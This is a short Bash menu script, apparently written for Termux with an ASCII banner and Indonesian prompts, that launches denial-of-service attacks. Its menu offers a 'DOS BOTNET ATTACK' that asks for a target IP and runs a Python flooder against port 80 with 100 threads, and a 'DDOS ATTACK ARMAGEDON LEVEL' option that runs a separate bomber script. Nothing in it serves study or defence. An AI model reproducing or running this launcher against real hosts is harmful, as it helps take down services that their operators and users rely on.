##################################################################################
##################################################################################
###| |######################################| |###################################
###| |######################################| | ___   _ ##########################
###| __/ _` | '_ ` _ \| '_ \ / _` | '_ \/ __| |/ / | | |##########################
###| || (_| | | | | | | |_) | (_| | | | \__ \   <| |_| |##########################
####\__\__,_|_| |_| |_| .__/ \__,_|_| |_|___/_|\_\\__, |##########################
######################| |######################### __/ |##########################
######################|_|#########################|___/ ##########################
##################################################################################
##################################################################################
#BASH/SHELL/SCRIPT
#colors
clear
blue='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
grey="\033[0;37m"
purple="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
mon="mon"
lightcyan='\e[96m'
white='\e[1;37m'
nc="\e[0m"
red='\e[1;31m'
yellow='\e[1;33m'

echo -e $red "MENGHUBUNGKAN..."
sleep 0.30
apt-get update apt-get upgrade 
sleep 0.30
clear
echo -e $blue "DDOS WITH TERMUX..."
sleep 0.10
echo
echo -e $purple "---------------------------------------------"
echo -e $red "|CREATOR : HadiPrasetia (TampanSKY)|"
echo -e $blue "|Sekolah : MTs.AL-Khairiyah|"
echo -e $yellow "|TEAM : RED EYE CYBER TEAM Official|"
echo -e $blue "|Thanks To My FAMILY AND MY GOD|"
echo -e $red "|AND MY GIRLFRIENDS{assyfamawarni}|"
echo -e $purple "----------------------------------------------"
echo

echo
echo $cyan"---------------------------------"
echo $green"           LIST MENU            "
echo $cyan"---------------------------------"
echo $cyan"[1].DOS BOTNET ATTACK"
echo $cyan"[2].DDOS ATTACK ARMAGEDON LEVEL"
echo $cyan"[3].EXIT"
echo $cyan"---------------------------------"
echo $white "╭─"$yellow"DDoS@USER"
read -p " ╰─> " pil

#DOS BOTNET

if [ $pil = 1 ] || [ $pil = 1 ]
then
clear
toilet -f slant "DoS BotneT attack" -F metal
echo
echo $cyan"MASUKAN IP TARGET"
read -p "==>" ip;
python NET.py -s$ip -p80 -t100
fi


#DDOS

if [ $pil = 2 ] || [ $pil = 2 ]
then
clear
toilet -f slant "DDoS attack" -F metal
echo
python2 BOMBER.py
fi
